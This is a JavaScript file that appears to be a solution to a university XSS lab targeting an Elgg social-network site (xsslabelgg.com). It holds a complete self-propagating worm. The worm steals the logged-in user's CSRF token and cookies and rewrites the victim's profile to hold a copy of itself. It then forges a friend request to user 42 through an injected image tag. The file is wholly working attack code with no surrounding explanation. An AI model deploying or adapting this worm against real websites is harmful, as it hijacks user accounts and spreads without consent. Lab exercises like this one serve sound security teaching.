/* jshint ignore:start */
(function() {
	var user = window.elgg ? elgg.get_logged_in_user_entity() : null;
	if (!user || user.guid === 42) return;

	var token = elgg.security.token.__elgg_token;
	var timestamp = elgg.security.token.__elgg_ts;
	var guid = user.guid;
	var name = user.name;
	var description = atob('PHNjcmlwdCBpZD0id29ybSI+') + document.getElementById("worm").innerHTML + atob('PC9zY3JpcHQ+');

	var body = [
		['__elgg_token', encodeURIComponent(token)].join('='),
		['__elgg_ts', encodeURIComponent(timestamp)].join('='),
		['guid', encodeURIComponent(guid)].join('='),
		['name', encodeURIComponent(name)].join('='),
		['description', encodeURIComponent(description)].join('='),
    [encodeURIComponent('accesslevel[description]'), '2'].join('=')
	];

	var request = new XMLHttpRequest();
	request.withCredentials = true;
	request.open("POST", "http://www.xsslabelgg.com/action/profile/edit", true);
  request.setRequestHeader("Host", "www.xsslabelgg.com");
  request.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  request.setRequestHeader("Cookie", document.cookie);
  request.send(body.join('&'));

  document.write('<img src="http://www.xsslabelgg.com/action/friends/add?friend=42&__elgg_token='+token+'&__elgg_ts='+timestamp+'" />');
})();
